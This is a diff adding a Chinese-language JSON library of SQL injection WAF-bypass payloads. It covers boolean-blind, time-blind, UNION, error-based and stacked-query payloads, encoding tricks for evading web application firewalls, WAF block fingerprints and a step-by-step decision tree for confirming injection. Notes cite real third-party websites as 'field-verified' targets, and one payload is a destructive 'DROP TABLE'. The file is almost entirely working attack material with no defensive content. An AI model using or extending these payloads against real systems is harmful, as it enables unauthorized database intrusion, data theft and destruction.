@@ -1,0 +1,102 @@
+{
+  "name": "SQL注入WAF绕过Payload库",
+  "version": "2.0",
+  "based_on": "ihep.cas.cn + bpeg.cn + didachuxing.com 实战验证",
+  "categories": {
+    "basic_probe": {
+      "description": "基础探测，检测参数是否参与SQL查询",
+      "payloads": [
+        {"name": "单引号", "payload": "'", "encoding": "raw", "expect": "SQL错误或响应变化"},
+        {"name": "双引号", "payload": "\"", "encoding": "raw", "expect": "SQL错误"},
+        {"name": "反斜杠", "payload": "\\", "encoding": "raw", "expect": "转义异常"},
+        {"name": "括号闭合", "payload": "')", "encoding": "raw", "expect": "SQL错误"},
+        {"name": "注释符", "payload": "--", "encoding": "raw", "expect": "注释掉后续SQL"}
+      ]
+    },
+    "boolean_blind": {
+      "description": "布尔盲注，AND型条件判断",
+      "payloads": [
+        {"name": "AND 1=1", "payload": "1 AND 1=1", "encoding": "raw", "bypasses": "无空格", "notes": "实战验证: ihep.edu误报排除"},
+        {"name": "AND 1=2", "payload": "1 AND 1=2", "encoding": "raw", "bypasses": "无空格"},
+        {"name": "OR 1=1", "payload": "1 OR 1=1", "encoding": "raw", "notes": "ihep.cpc被WAF拦截OR关键字"},
+        {"name": "URL编码空格", "payload": "1%20AND%201=1", "encoding": "url", "bypasses": "标准编码"},
+        {"name": "加号替代空格", "payload": "1+AND+1=1", "encoding": "url", "bypasses": "+代替空格"},
+        {"name": "注释代替空格", "payload": "1/**/AND/**/1=1", "encoding": "raw", "bypasses": "/**/注释"},
+        {"name": "内联注释-绕过WAF", "payload": "1/*!50000AND*/1=1", "encoding": "raw", "bypasses": "MySQL内联注释", "notes": "实战验证: 绕过ihep WAF但确认参数化查询"},
+        {"name": "内联注释-OR", "payload": "1/*!50000OR*/1=1", "encoding": "raw", "bypasses": "MySQL内联注释OR"},
+        {"name": "双重URL编码", "payload": "1%2520AND%25201=1", "encoding": "double_url", "bypasses": "双重编码"},
+        {"name": "制表符替代空格", "payload": "1%09AND%091=1", "encoding": "url", "bypasses": "%09制表符"},
+        {"name": "换行符替代空格", "payload": "1%0aAND%0a1=1", "encoding": "url", "bypasses": "%0a换行符"},
+        {"name": "括号闭合绕过", "payload": "1)) AND 1=1--", "encoding": "raw", "bypasses": "括号闭合"},
+        {"name": "宽字节注入", "payload": "1%df%27", "encoding": "url", "bypasses": "GBK宽字节", "notes": "实战验证: ihep测试"},
+        {"name": "Hex编码", "payload": "1 AND 0x31=0x31", "encoding": "raw", "bypasses": "十六进制比较"},
+        {"name": "科学计数法", "payload": "1e0AND 1e0=1e0", "encoding": "raw", "bypasses": "科学计数法"},
+        {"name": "NULL比较", "payload": "1 AND NULL IS NULL", "encoding": "raw", "bypasses": "NULL关键字"},
+        {"name": "LIKE替代", "payload": "1 AND 'a' LIKE 'a'", "encoding": "raw", "bypasses": "LIKE替代="},
+        {"name": "BETWEEN替代", "payload": "1 AND 1 BETWEEN 1 AND 1", "encoding": "raw", "bypasses": "BETWEEN"}
+      ]
+    },
+    "time_blind": {
+      "description": "时间盲注，延时函数检测",
+      "payloads": [
+        {"name": "MySQL SLEEP", "payload": "1 AND SLEEP(5)--", "encoding": "raw", "db": "MySQL"},
+        {"name": "MySQL BENCHMARK", "payload": "1 AND BENCHMARK(5000000,MD5(1))--", "encoding": "raw", "db": "MySQL"},
+        {"name": "PostgreSQL PG_SLEEP", "payload": "1;SELECT PG_SLEEP(5)--", "encoding": "raw", "db": "PostgreSQL"},
+        {"name": "MSSQL WAITFOR", "payload": "1;WAITFOR DELAY '0:0:5'--", "encoding": "raw", "db": "MSSQL"},
+        {"name": "Oracle DBMS_LOCK", "payload": "1 AND DBMS_LOCK.SLEEP(5)=0--", "encoding": "raw", "db": "Oracle"},
+        {"name": "无空格SLEEP", "payload": "1 AND SLEEP(5)", "encoding": "raw", "bypasses": "无空格"},
+        {"name": "内联注释SLEEP", "payload": "1/*!50000AND*/SLEEP(5)--", "encoding": "raw", "bypasses": "内联注释"}
+      ]
+    },
+    "union_select": {
+      "description": "UNION SELECT注入",
+      "payloads": [
+        {"name": "标准UNION", "payload": "1 UNION SELECT NULL--", "encoding": "raw"},
+        {"name": "多列探测", "payload": "1 ORDER BY 1--", "encoding": "raw", "notes": "先探测列数"},
+        {"name": "ORDER BY 递增", "payload": "1 ORDER BY 10--", "encoding": "raw"},
+        {"name": "内联注释UNION", "payload": "1/*!50000UNION*//*!50000SELECT*/NULL--", "encoding": "raw", "bypasses": "内联注释"},
+        {"name": "大小写混合", "payload": "1 UnIoN SeLeCt NULL--", "encoding": "raw", "bypasses": "大小写"},
+        {"name": "重复关键字", "payload": "1 UNIUNIONON SELSELECTECT NULL--", "encoding": "raw", "bypasses": "WAF关键字过滤"},
+        {"name": "NULL全部列", "payload": "1 UNION SELECT NULL,NULL,NULL--", "encoding": "raw"},
+        {"name": "信息提取", "payload": "1 UNION SELECT @@version,database(),user()--", "encoding": "raw", "db": "MySQL"}
+      ]
+    },
+    "error_based": {
+      "description": "报错注入",
+      "payloads": [
+        {"name": "ExtractValue", "payload": "1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--", "encoding": "raw", "db": "MySQL"},
+        {"name": "UpdateXML", "payload": "1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--", "encoding": "raw", "db": "MySQL"},
+        {"name": "GeometryCollection", "payload": "1 AND GEOMETRYCOLLECTION((SELECT * FROM(SELECT * FROM(SELECT @@version)a)b))--", "encoding": "raw", "db": "MySQL"},
+        {"name": "Polygon", "payload": "1 AND POLYGON((SELECT * FROM(SELECT * FROM(SELECT @@version)a)b))--", "encoding": "raw", "db": "MySQL", "notes": "实战验证: ihep测试"}
+      ]
+    },
+    "stacked_queries": {
+      "description": "堆叠查询",
+      "payloads": [
+        {"name": "分号分隔", "payload": "1;SELECT 1--", "encoding": "raw"},
+        {"name": "多语句", "payload": "1;DROP TABLE test--", "encoding": "raw", "notes": "仅测试环境"}
+      ]
+    }
+  },
+  "waf_fingerprints": {
+    "description": "WAF拦截特征识别",
+    "patterns": [
+      {"waf": "阿里云WAF", "code": "405", "body": "访问被拦截", "notes": "ihep主站"},
+      {"waf": "华为云WAF", "code": "403", "body": "HWWAFSESID", "notes": "bpeg.cn"},
+      {"waf": "CloudWAF", "code": "624", "body": "Access Denied", "notes": "didachuxing"},
+      {"waf": "通用WAF", "code": "000", "body": "connection reset", "notes": "拦截特征"},
+      {"waf": "通用WAF", "code": "502", "body": "Bad Gateway", "notes": "前置代理拒绝"}
+    ]
+  },
+  "decision_tree": {
+    "description": "SQL注入检测决策树",
+    "steps": [
+      "1. 基本探测: 发送 id=1 vs id=1' → 观察响应大小/错误信息",
+      "2. 参数差异: 发送 id=1 vs id=2 vs id=99999 → MD5对比，确认参数参与查询",
+      "3. 布尔盲注: 发送 id=1AND1=1 vs id=1AND1=2 → diff对比，差异=SQL注入",
+      "4. 如被WAF拦截: 尝试无空格/内联注释/双重编码/大小写绕过",
+      "5. 如绕过WAF但MD5相同: 参数化查询，非SQL注入，标记误报",
+      "6. 如绕过成功且MD5不同: 确认SQL注入，记录payload和绕过方法"
+    ]
+  }
+}
